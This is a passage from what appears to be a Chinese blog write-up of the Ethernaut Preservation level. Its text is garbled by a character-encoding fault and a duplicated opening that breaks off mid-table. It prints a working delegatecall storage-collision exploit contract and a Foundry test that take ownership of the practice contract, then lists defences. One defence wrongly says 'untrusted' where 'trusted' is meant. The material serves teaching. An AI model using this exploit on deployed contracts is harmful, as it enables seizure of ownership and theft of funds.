href=\"https://ethernaut.openzeppelin.com/level/16\">Ethernaut Level 16 - Preservation</a><br><strong>æ”»å‡»ç±»å‹</strong>: <code>delegatecall</code> å­˜å‚¨å¸ƒå±€æ“çºµ<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>æœ¬å…³çš„ç›®æ ‡æ˜¯è·å– <code>Preservation</code> åˆçº¦çš„æ‰€æœ‰æƒï¼Œå³æˆä¸ºè¯¥åˆçº¦çš„ <code>owner</code>ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel16.svg\" alt=\"Preservation Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p><code>Preservation</code> åˆçº¦çš„ <code>owner</code> æ˜¯ç§æœ‰çš„ï¼Œå¹¶ä¸”æ²¡æœ‰ç›´æ¥çš„å‡½æ•°æ¥ä¿®æ”¹å®ƒã€‚æ¼æ´éšè—åœ¨ä½¿ç”¨ <code>delegatecall</code> çš„ <code>setFirstTime</code> å’Œ <code>setSecondTime</code> å‡½æ•°ä¸­ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Preservation &#123;</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    uint storedTime;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ... constructor ...</span><br><span class=\"line\"></span><br><span class=\"line\">    function setFirstTime(uint _timeStamp) public &#123;</span><br><span class=\"line\">        timeZone1Library.delegatecall(abi.encodePacked(bytes4(keccak256(&quot;setTime(uint256)&quot;)), _timeStamp));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setSecondTime(uint _timeStamp) public &#123;</span><br><span class=\"line\">        timeZone2Library.delegatecall(abi.encodePacked(bytes4(keccak256(&quot;setTime(uint256)&quot;)), _timeStamp));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>delegatecall</code> æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„æ“ä½œç ã€‚å®ƒä¼šåœ¨è°ƒç”¨è€…åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œå¦ä¸€ä¸ªåˆçº¦çš„ä»£ç ã€‚è¿™æ„å‘³ç€ï¼Œè¢«è°ƒç”¨åˆçº¦ï¼ˆ<code>library</code>ï¼‰çš„ä»£ç å¯ä»¥ä¿®æ”¹è°ƒç”¨è€…åˆçº¦ï¼ˆ<code>Preservation</code>ï¼‰çš„å­˜å‚¨ã€‚</p>\n<p>å½“ <code>setFirstTime</code> é€šè¿‡ <code>delegatecall</code> è°ƒç”¨ <code>timeZone1Library</code> çš„ <code>setTime</code> å‡½æ•°æ—¶ï¼Œ<code>setTime</code> å‡½æ•°ä¿®æ”¹çš„å­˜å‚¨æ§½ä½æ˜¯ <code>Preservation</code> åˆçº¦çš„æ§½ä½ã€‚</p>\n<p>è®©æˆ‘ä»¬æ¯”è¾ƒä¸€ä¸‹ <code>Preservation</code> å’Œ <code>LibraryContract</code> çš„å­˜å‚¨å¸ƒå±€ï¼š</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Slot</th>\n<th align=\"left\"><code>Preservation</code> åˆçº¦</th>\n<th align=\"left\"><code>LibraryContract</code> åˆçº¦</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>timeZone1Library</code></td>\n<td align=\"left\"><code>storedTime</code></td>\n</tr>\n<tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><code>timeZone2Library</code></td>\n<td align=\"left\">(æœªä½¿ç”¨)</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><code>owner</code></td>\n<td align=\"left\">(æœªä½¿ç”¨)</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><code>storedTime</code></td>\n<td align=\"left\">(æœªä½¿ç”¨)</td>\n</tr>\n</tbody></table>\n<p>å½“ <code>LibraryContract.setTime(uint)</code> è¢« <code>delegatecall</code> è°ƒç”¨æ—¶ï¼Œå®ƒä»¥ä¸ºè‡ªå·±åœ¨ä¿®æ”¹ <code>storedTime</code>ï¼ˆä½äº slot 0ï¼‰ã€‚ä½†å®é™…ä¸Šï¼Œå®ƒä¿®æ”¹çš„æ˜¯ <code>Preservation</code> åˆçº¦çš„ slot 0ï¼Œä¹Ÿå°±æ˜¯ <code>timeZone1Library</code> çš„åœ°å€ï¼</p>\n<p>è¿™å°±ç»™äº†æˆ‘ä»¬ä¸€ä¸ªæ”»å‡»è·¯å¾„ï¼š</p>\n<ol>\n<li><strong>ç¬¬ä¸€æ¬¡è°ƒç”¨ <code>setFirstTime</code></strong>: æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„ <code>_timeStamp</code>ï¼Œè¿™ä¸ª <code>_timeStamp</code> å…¶å®æ˜¯æˆ‘ä»¬çš„æ”»å‡»åˆçº¦çš„åœ°å€ã€‚è¿™æ¬¡è°ƒç”¨ä¼šæŠŠ <code>Preservation</code> åˆçº¦çš„ <code>timeZone1Library</code> (slot 0) ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ”»å‡»åˆçº¦åœ°å€ã€‚</li>\n<li><strong>åˆ›å»ºæ”»å‡»åˆçº¦</strong>: æˆ‘ä»¬çš„æ”»å‡»åˆçº¦éœ€è¦æœ‰ä¸€ä¸ª <code>setTime(uint)</code> å‡½æ•°ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°çš„å®ç°ä¸æ˜¯ä¸ºäº†è®¾ç½®æ—¶é—´ï¼Œè€Œæ˜¯ä¸ºäº†ä¿®æ”¹ <code>owner</code>ã€‚ä¸ºäº†èƒ½ä¿®æ”¹ <code>owner</code>ï¼ˆä½äº slot 2ï¼‰ï¼Œæˆ‘ä»¬çš„æ”»å‡»åˆçº¦éœ€è¦æœ‰ä¸ <code>Preservation</code> ç›¸ä¼¼çš„å­˜å‚¨å¸ƒå±€ï¼Œä½¿å¾— <code>owner</code> å˜é‡ä¹Ÿä½äº slot 2ã€‚</li>\n<li><strong>ç¬¬äºŒæ¬¡è°ƒç”¨ <code>setFirstTime</code></strong>: ç°åœ¨ <code>timeZone1Library</code> å·²ç»æŒ‡å‘æˆ‘ä»¬çš„æ”»å‡»åˆçº¦ã€‚æˆ‘ä»¬å†æ¬¡è°ƒç”¨ <code>setFirstTime</code>ï¼Œè¿™æ¬¡ä¼ å…¥æˆ‘ä»¬è‡ªå·±çš„åœ°å€ï¼ˆ<code>player</code>ï¼‰ä½œä¸º <code>_timeStamp</code>ã€‚<code>delegatecall</code> ä¼šæ‰§è¡Œæˆ‘ä»¬æ”»å‡»åˆçº¦çš„ <code>setTime</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå°†ä¼ å…¥çš„ <code>_timeStamp</code> (æˆ‘ä»¬çš„åœ°å€) å†™å…¥ <code>owner</code> å˜é‡ï¼ˆslot 2ï¼‰ï¼Œä»è€Œä½¿æˆ‘ä»¬æˆä¸º <code>owner</code>ã€‚</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>æ”»å‡»åˆçº¦çš„å­˜å‚¨å¸ƒå±€å¿…é¡»ä¸ <code>Preservation</code> å…¼å®¹ï¼Œè‡³å°‘åœ¨å‰ä¸‰ä¸ªæ§½ä½ä¸Šæ˜¯è¿™æ ·ã€‚å®ƒçš„ <code>setTime</code> å‡½æ•°è¢«è®¾è®¡ç”¨æ¥ä¿®æ”¹ <code>owner</code>ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ”»å‡»åˆçº¦</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    // ä¿æŒä¸ Preservation åˆçº¦ç›¸åŒçš„å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    // è¿™ä¸ªå‡½æ•°ç­¾åå¿…é¡»ä¸åº“å‡½æ•°åŒ¹é…</span><br><span class=\"line\">    // ä½†å®ç°æ˜¯æ¶æ„çš„</span><br><span class=\"line\">    function setTime(uint256 _newOwner) public &#123;</span><br><span class=\"line\">        // å½“è¢« delegatecall è°ƒç”¨æ—¶ï¼Œå®ƒä¼šä¿®æ”¹ Preservation åˆçº¦çš„ slot 2</span><br><span class=\"line\">        owner = address(uint160(_newOwner));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/16_Preservation.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ”»å‡»åˆçº¦å®šä¹‰ (åŒä¸Š)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    function setTime(uint256 _newOwner) public &#123; owner = address(uint160(_newOwner)); &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PreservationTest is Test &#123;</span><br><span class=\"line\">    Preservation instance;</span><br><span class=\"line\">    Attack attackContract;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦å’Œæ”»å‡»åˆçº¦</span><br><span class=\"line\">        LibraryContract lib = new LibraryContract();</span><br><span class=\"line\">        instance = new Preservation(address(lib), address(lib));</span><br><span class=\"line\">        attackContract = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player, player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 1: å°† timeZone1Library (slot 0) ä¿®æ”¹ä¸ºæ”»å‡»åˆçº¦çš„åœ°å€</span><br><span class=\"line\">        instance.setFirstTime(uint256(uint160(address(attackContract))));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯ timeZone1Library æ˜¯å¦å·²æ›´æ”¹</span><br><span class=\"line\">        assertEq(instance.timeZone1Library(), address(attackContract));</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 2: å†æ¬¡è°ƒç”¨ setFirstTimeï¼Œè¿™æ¬¡ä¼šæ‰§è¡Œæ”»å‡»åˆçº¦çš„ setTime å‡½æ•°</span><br><span class=\"line\">        // å°† owner (slot 2) ä¿®æ”¹ä¸º player çš„åœ°å€</span><br><span class=\"line\">        instance.setFirstTime(uint256(uint160(player)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯ owner æ˜¯å¦å·²æ›´æ”¹</span><br><span class=\"line\">        assertEq(instance.owner(), player);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>éƒ¨ç½²æ”»å‡»åˆçº¦</strong>: åˆ›å»ºä¸€ä¸ªå…·æœ‰æ¶æ„ <code>setTime</code> å‡½æ•°å’Œå…¼å®¹å­˜å‚¨å¸ƒå±€çš„æ”»å‡»åˆçº¦ã€‚</li>\n<li><strong>ç¬¬ä¸€æ¬¡ <code>setFirstTime</code> è°ƒç”¨</strong>: è°ƒç”¨ <code>setFirstTime</code>ï¼Œå‚æ•°ä¸ºæ”»å‡»åˆçº¦çš„åœ°å€ã€‚è¿™ä¼šåŠ«æŒ <code>timeZone1Library</code> æŒ‡é’ˆã€‚</li>\n<li><strong>ç¬¬äºŒæ¬¡ <code>setFirstTime</code> è°ƒç”¨</strong>: å†æ¬¡è°ƒç”¨ <code>setFirstTime</code>ï¼Œå‚æ•°ä¸º <code>player</code> çš„åœ°å€ã€‚è¿™ä¼šæ‰§è¡Œæ”»å‡»åˆçº¦çš„ä»£ç ï¼Œå°† <code>player</code> çš„åœ°å€å†™å…¥ <code>Preservation</code> åˆçº¦çš„ <code>owner</code> å­˜å‚¨æ§½ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>ä½¿ç”¨ <code>library</code> å…³é”®å­—</strong>: Solidity çš„ <code>library</code> ç±»å‹æ˜¯ä¸“é—¨ä¸ºæ­¤ç±»åŠŸèƒ½è®¾è®¡çš„ã€‚åº“æ˜¯æ— çŠ¶æ€çš„ï¼Œå¹¶ä¸”ä¸èƒ½è¢« <code>delegatecall</code> ç›´æ¥è°ƒç”¨æ¥ä¿®æ”¹çŠ¶æ€ï¼ˆé™¤éä½¿ç”¨äº†ç‰¹å®šçš„æŠ€å·§ï¼‰ã€‚å®ƒä»¬å¯ä»¥é˜²æ­¢å­˜å‚¨å¸ƒå±€å†²çªã€‚</li>\n<li><strong>ç¡®ä¿å…¼å®¹çš„å­˜å‚¨å¸ƒå±€</strong>: å¦‚æœä½ å¿…é¡»ä½¿ç”¨ <code>delegatecall</code> åˆ°ä¸€ä¸ªéåº“åˆçº¦ï¼Œè¯·åŠ¡å¿…ç¡®ä¿ä¸¤ä¸ªåˆçº¦å…·æœ‰å®Œå…¨ç›¸åŒä¸”å…¼å®¹çš„å­˜å‚¨å¸ƒå±€ã€‚ä»»ä½•å·®å¼‚éƒ½å¯èƒ½å¯¼è‡´ä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚</li>\n<li><strong>ä¸è¦å°† <code>delegatecall</code> æš´éœ²ç»™ç”¨æˆ·è¾“å…¥</strong>: é¿å…è®©ç”¨æˆ·æ§åˆ¶ <code>delegatecall</code> çš„ç›®æ ‡åœ°å€æˆ–å‚æ•°ã€‚<code>delegatecall</code> åº”è¯¥åªç”¨äºä¸å—ä¿¡ä»»å’Œç»è¿‡éªŒè¯çš„ä»£ç è¿›è¡Œäº¤äº’ã€‚</li>\n<li><strong>ä½¿ç”¨ <code>call</code> è€Œä¸æ˜¯ <code>delegatecall</code></strong>: å¦‚æœåªæ˜¯æƒ³è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦çš„å‡½æ•°ï¼Œè€Œä¸éœ€è¦åœ¨å½“å‰åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œè¯·ä½¿ç”¨æ ‡å‡†çš„ <code>call</code>ã€‚<code>call</code> ä¼šåœ¨è¢«è°ƒç”¨åˆçº¦è‡ªå·±çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä¸ä¼šå½±å“è°ƒç”¨è€…çš„å­˜å‚¨ã€‚</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong><code>delegatecall</code></strong>: EVM ä¸­æœ€å¼ºå¤§çš„æ“ä½œç ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æœ€å±é™©çš„ã€‚å®ƒå…è®¸ä»£ç é‡ç”¨ï¼Œä½†ä¹Ÿå¸¦æ¥äº†å­˜å‚¨æ“çºµçš„é£é™©ã€‚</li>\n<li><strong>å­˜å‚¨å¸ƒå±€ (Storage Layout)</strong>: ç†è§£Solidityå¦‚ä½•å°†å˜é‡å­˜å‚¨åœ¨EVMçš„å­˜å‚¨æ§½ä¸­æ˜¯é«˜çº§æ™ºèƒ½åˆçº¦å®‰å…¨åˆ†æçš„åŸºç¡€ã€‚<code>forge inspect &lt;Contract&gt; storage-layout</code> æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å·¥å…·ã€‚</li>\n<li><strong>ç±»å‹è½¬æ¢</strong>: å°† <code>address</code> è½¬æ¢ä¸º <code>uint</code> æ˜¯æœ¬æ¬¡æ”»å‡»çš„å…³é”®ã€‚<code>uint256(uint160(address))</code> æ˜¯å®ç°è¿™ä¸€ç‚¹çš„æ ‡å‡†æ–¹æ³•ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li><code>delegatecall</code> åœ¨è°ƒç”¨è€…çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»£ç ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥ä¿®æ”¹è°ƒç”¨è€…çš„å­˜å‚¨ã€‚</li>\n<li>å½“è°ƒç”¨è€…å’Œè¢«è°ƒç”¨è€…çš„å­˜å‚¨å¸ƒå±€ä¸åŒ¹é…æ—¶ï¼Œ<code>delegatecall</code> ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„ã€ç¾éš¾æ€§çš„çŠ¶æ€æŸåã€‚</li>\n<li>åˆçº¦çš„å­˜å‚¨æ§½æ˜¯æŒ‰é¡ºåºåˆ†é…çš„ï¼Œäº†è§£è¿™ä¸ªé¡ºåºæ˜¯é¢„æµ‹ <code>delegatecall</code> å½±å“çš„å…³é”®ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>åˆ©ç”¨ <code>delegatecall</code> å’Œä¸åŒ¹é…çš„å­˜å‚¨å¸ƒå±€æ¥è¦†ç›–åˆçº¦çš„å…³é”®çŠ¶æ€å˜é‡ï¼ˆå¦‚æŒ‡é’ˆæˆ–æ‰€æœ‰è€…åœ°å€ï¼‰ã€‚</li>\n<li>é€šè¿‡ä¸¤æ­¥æ”»å‡»ï¼Œé¦–å…ˆåŠ«æŒä»£ç æ‰§è¡Œæµï¼ˆé€šè¿‡è¦†ç›–åº“åœ°å€ï¼‰ï¼Œç„¶åæ‰§è¡Œæ¶æ„ä»£ç æ¥è·å–æƒé™ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä¸¥æ ¼é™åˆ¶ <code>delegatecall</code> çš„ä½¿ç”¨ã€‚</li>\n<li>ä¼˜å…ˆä½¿ç”¨ <code>library</code> å…³é”®å­—æ¥åˆ›å»ºæ— çŠ¶æ€çš„è¾…åŠ©åˆçº¦ã€‚</li>\n<li>ç¡®ä¿ <code>delegatecall</code> çš„ç›®æ ‡åˆçº¦å…·æœ‰å…¼å®¹çš„å­˜å‚¨å¸ƒå±€ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#delegatecall-callcode-and-libraries\">Solidity Docs: Delegatecall &#x2F; Callcode and Libraries</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2019/09/delegatecall-gotchas/\">Consensys: Delegatecall Vulnerabilities</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-16-Preservation-Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ\"><a href=\"#ğŸ¯-Ethernaut-Level-16-Preservation-Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 16: Preservation - Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ\"></a>ğŸ¯ Ethernaut Level 16: Preservation - Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/16\">Ethernaut Level 16 - Preservation</a><br><strong>æ”»å‡»ç±»å‹</strong>: <code>delegatecall</code> å­˜å‚¨å¸ƒå±€æ“çºµ<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>æœ¬å…³çš„ç›®æ ‡æ˜¯è·å– <code>Preservation</code> åˆçº¦çš„æ‰€æœ‰æƒï¼Œå³æˆä¸ºè¯¥åˆçº¦çš„ <code>owner</code>ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel16.svg\" alt=\"Preservation Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p><code>Preservation</code> åˆçº¦çš„ <code>owner</code> æ˜¯ç§æœ‰çš„ï¼Œå¹¶ä¸”æ²¡æœ‰ç›´æ¥çš„å‡½æ•°æ¥ä¿®æ”¹å®ƒã€‚æ¼æ´éšè—åœ¨ä½¿ç”¨ <code>delegatecall</code> çš„ <code>setFirstTime</code> å’Œ <code>setSecondTime</code> å‡½æ•°ä¸­ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Preservation &#123;</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    uint storedTime;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ... constructor ...</span><br><span class=\"line\"></span><br><span class=\"line\">    function setFirstTime(uint _timeStamp) public &#123;</span><br><span class=\"line\">        timeZone1Library.delegatecall(abi.encodePacked(bytes4(keccak256(&quot;setTime(uint256)&quot;)), _timeStamp));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setSecondTime(uint _timeStamp) public &#123;</span><br><span class=\"line\">        timeZone2Library.delegatecall(abi.encodePacked(bytes4(keccak256(&quot;setTime(uint256)&quot;)), _timeStamp));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>delegatecall</code> æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„æ“ä½œç ã€‚å®ƒä¼šåœ¨è°ƒç”¨è€…åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œå¦ä¸€ä¸ªåˆçº¦çš„ä»£ç ã€‚è¿™æ„å‘³ç€ï¼Œè¢«è°ƒç”¨åˆçº¦ï¼ˆ<code>library</code>ï¼‰çš„ä»£ç å¯ä»¥ä¿®æ”¹è°ƒç”¨è€…åˆçº¦ï¼ˆ<code>Preservation</code>ï¼‰çš„å­˜å‚¨ã€‚</p>\n<p>å½“ <code>setFirstTime</code> é€šè¿‡ <code>delegatecall</code> è°ƒç”¨ <code>timeZone1Library</code> çš„ <code>setTime</code> å‡½æ•°æ—¶ï¼Œ<code>setTime</code> å‡½æ•°ä¿®æ”¹çš„å­˜å‚¨æ§½ä½æ˜¯ <code>Preservation</code> åˆçº¦çš„æ§½ä½ã€‚</p>\n<p>è®©æˆ‘ä»¬æ¯”è¾ƒä¸€ä¸‹ <code>Preservation</code> å’Œ <code>LibraryContract</code> çš„å­˜å‚¨å¸ƒå±€ï¼š</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Slot</th>\n<th align=\"left\"><code>Preservation</code> åˆçº¦</th>\n<th align=\"left\"><code>LibraryContract</code> åˆçº¦</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>timeZone1Library</code></td>\n<td align=\"left\"><code>storedTime</code></td>\n</tr>\n<tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><code>timeZone2Library</code></td>\n<td align=\"left\">(æœªä½¿ç”¨)</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><code>owner</code></td>\n<td 